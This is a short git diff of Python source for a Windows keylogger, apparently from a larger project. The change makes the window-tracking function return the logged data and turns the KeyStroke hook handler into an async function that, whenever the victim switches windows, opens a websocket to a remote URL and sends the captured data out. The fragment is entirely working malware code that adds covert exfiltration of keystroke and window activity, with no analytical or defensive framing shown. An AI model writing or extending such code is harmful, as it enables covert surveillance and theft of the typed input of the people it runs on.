@@ -54,14 +54,19 @@ def get_current_process():
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
+    return keylogger_data
 
-def KeyStroke(event):
+
+async def KeyStroke(event):
     global current_window
 
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
-        get_current_process()
+        data = get_current_process()
+
+        async with websockets.connect(url) as websocket:
+            await websocket.send(data)
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
